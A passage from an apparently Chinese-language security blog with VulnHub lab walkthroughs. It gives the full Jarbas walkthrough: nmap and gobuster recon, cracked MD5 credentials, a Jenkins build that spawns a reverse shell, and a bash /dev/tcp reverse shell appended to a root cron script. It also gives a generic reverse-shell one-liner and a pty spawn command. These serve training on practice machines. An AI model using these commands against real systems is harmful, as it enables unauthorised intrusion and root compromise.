/root/flag.txt<br><span class="hljs-built_in">cat</span> /root/flag.txt<br>9740616875908d91ddcdaa8aea3af366<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）主要是对CMS，drupal的漏洞进行利用以及如何使用msf<br>（2）dirtrydcow提权的方法，主要是对root的密码进行重置<br>（3）使用python获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>drupal</tag>
      
      <tag>提权-dirtycow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarbas</title>
    <link href="/vulnhub/Jarbas/"/>
    <url>/vulnhub/Jarbas/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:07 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00015s latency).<br>MAC Address: 0A:00:27:00:00:52 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00027s latency).<br>MAC Address: 08:00:27:32:09:17 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00072s latency).<br>MAC Address: 08:00:27:42:06:E4 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.00 seconds<br><br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.3 -oA nmapscan/ports<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:04 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00044s latency).<br>Not shown: 65531 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:42:06:E4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.68 seconds<br></code></pre></td></tr></table></figure><p>发现靶机开放<code>22,80,3306,8080</code>端口<br>（2）对端口细节进行扫描<br>    用TCP扫描（-sT）查看其服务版本（-sV）和操作系统（-O）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80,3306,8080  192.168.2.3 -oA nmapscan/detail <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:05 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00059s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/<span class="hljs-number">5.4</span>.<span class="hljs-number">16</span>)<br><span class="hljs-number">3306</span>/tcp open  mysql   MariaDB (unauthorized)<br><span class="hljs-number">8080</span>/tcp open  http    Jetty <span class="hljs-number">9.4</span>.z-SNAPSHOT<br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">42</span>:<span class="hljs-number">06</span>:E4 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Device type: general purpose<br>Running: Linux <span class="hljs-number">3</span>.X|<span class="hljs-number">4</span>.X<br>OS CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">3</span> cpe:/o:linux:linux_kernel:<span class="hljs-number">4</span><br>OS details: Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.9</span><br>Network Distance: <span class="hljs-number">1</span> hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">7.67</span> seconds<br></code></pre></td></tr></table></figure><p>（2）对端口进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80,3306,8080 192.168.2.3 -oA nmapscan/udp<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:13 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00030s latency).<br><br>PORT     STATE  SERVICE<br>22/udp   closed ssh<br>80/udp   closed http<br>3306/udp closed mysql<br>8080/udp closed http-alt<br>MAC Address: 08:00:27:42:06:E4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.46 seconds<br></code></pre></td></tr></table></figure><p>发现UDP端口全部关闭<br>（3）进行漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,3306,8080 192.168.2.3 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:14 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-trace: TRACE is enabled<br>| http-enum: <br>|_  /icons/: Potentially interesting folder w/ directory listing<br>| http-sql-injection: <br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://192.168.2.3:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=S%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|_    http://192.168.2.3:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.3<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.2.3:80/<br>|     Form <span class="hljs-built_in">id</span>: wmtb<br>|     Form action: /web/submit<br>|     <br>|     Path: http://192.168.2.3:80/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php<br>|     <br>|     Path: http://192.168.2.3:80/<br>|     Form <span class="hljs-built_in">id</span>: <br>|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>| http-enum: <br>|_  /robots.txt: Robots file<br>MAC Address: 08:00:27:42:06:E4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 41.49 seconds<br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）使用<code>gobuster</code>进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.3 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.3<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 32808]<br>/.html                (Status: 403) [Size: 207]<br>/access.html          (Status: 200) [Size: 359]<br>/.html                (Status: 403) [Size: 207]<br>Progress: 622929 / 622932 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>（2）访问<code>access.html</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502052234539.png"><br>（3）得到相关的md5值，对MD5进行破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">5978a63b4654c73c60fa24f836386d87 italia99<br>f463f63616cb3f1e81ce46b39f882fd5 marianna<br>9b38e2b1e8b12f426b0d208a7ab6cb98 vipsu<br></code></pre></td></tr></table></figure><h2 id="8080端口渗透"><a href="#8080端口渗透" class="headerlink" title="8080端口渗透"></a>8080端口渗透</h2><p>（1）访问8080端口，发现是一个登录界面，同时暴露出<code>CMS</code>是<code>Jenkins</code><br>首要思路就是如何找到这个登录界面的账号和密码，寻找用户名和密码有如下几个思路：</p><ol><li>尝试默认登录，Jenkins是常见cms，可能存在默认密码</li><li>尝试弱口令爆破</li><li>尝试渗透寻找相关密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502052240069.png"><br>（2）最后尝试<code>eder:vipsu</code>成功进行登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502052241658.png"><br> 发现该系统的框架是<code>Jenkins</code><br>（3）构建新项目，并执行反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502052319940.png"><br>成功获取到shell，权限为jenkins<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nc -lvvp 4444                                              <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.3] 37256<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>bash-4.2$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=997(jenkins) gid=995(jenkins) <span class="hljs-built_in">groups</span>=995(jenkins) context=system_u:system_r:initrc_t:s0<br></code></pre></td></tr></table></figure></li></ol><h1 id="提权-crontab"><a href="#提权-crontab" class="headerlink" title="提权-crontab"></a>提权-crontab</h1><p>（1）查看<code>sudo -l</code>，没有发现有用的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br><span class="hljs-built_in">sudo</span>: no <span class="hljs-built_in">tty</span> present and no askpass program specified<br></code></pre></td></tr></table></figure><p>（2）查看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br>SHELL=/bin/bash<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br>*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>发现一个定时任务脚本<code>CleaningScript.sh</code>是以<code>root</code>权限每隔5分钟执行一次<br>（3）查看脚本内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">cat</span> /etc/script/CleaningScript.sh<br><span class="hljs-built_in">cat</span> /etc/script/CleaningScript.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">rm</span> -rf /var/log/httpd/access_log.txt<br></code></pre></td></tr></table></figure><p>（4）向脚本里面追加反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.4/5555 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/script/CleaningScript.sh<br>&lt;i &gt;&amp; /dev/tcp/192.168.2.4/5555 0&gt;&amp;1<span class="hljs-string">&quot; &gt;&gt; /etc/script/CleaningScript.sh </span><br></code></pre></td></tr></table></figure><p>（5）开启监听，最后成功进行提权，获得root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nc -lvnp 5555<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>listening on [any] 5555 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.3] 34124<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>[root@jarbas ~]# <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023<br></code></pre></td></tr></table></figure><p><strong>读取flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@jarbas ~]# <span class="hljs-built_in">cat</span> /root/flag.txt<br><span class="hljs-built_in">cat</span> /root/flag.txt<br>Hey!<br><br>Congratulations! You got it! I always knew you could <span class="hljs-keyword">do</span> it!<br>This challenge was very easy, huh? =)<br><br>Thanks <span class="hljs-keyword">for</span> appreciating this machine.<br><br>@tiagotvrs <br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）jenkins渗透，可以新建项目，在项目里面构建执行shell脚本，最后执行build，即可成功进行通信。<br>（2）crontab提权</p><ul><li>文件权限提权，向crontab脚本中追加shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jenkins</tag>
      
      <tag>提权-crontab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JIS-CTF-VULNUPLOAD</title>
    <link href="/vulnhub/JIS-CTF-VULNUPLOAD/"/>
    <url>/vulnhub/JIS-CTF-VULNUPLOAD/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24                                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:15 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00012s latency).                              <br>MAC Address: 0A:00:27:00:00:0A (Unknown)                            <br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2                                  <br>Host is up (0.00020s latency).                                <br>MAC Address: 08:00:27:5B:20:82 (Oracle VirtualBox virtual NIC)      Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5                                   <br>Host is up (0.00050s latency).                                      MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)      Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4   Host is up.                                              <br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.03 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.5 -oA nmapscan/ports                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:19 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.0061s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.69 seconds<br></code></pre></td></tr></table></figure><p>（2）对端口细节进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p 22,80 192.168.2.5 -oA nmapscan/detail <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:20 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00079s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.80 seconds<br></code></pre></td></tr></table></figure><p>（3）对端口进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80 192.168.2.5 -oA nmapscan/udp             <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:21 EST<br>Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan<br>Parallel DNS resolution of 1 host. Timing: About 0.00% <span class="hljs-keyword">done</span><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00072s latency).<br><br>PORT   STATE  SERVICE<br>22/udp closed ssh<br>80/udp closed http<br>MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.20 seconds<br></code></pre></td></tr></table></figure><p>（4）进行漏洞扫描</p><figure class="highlight 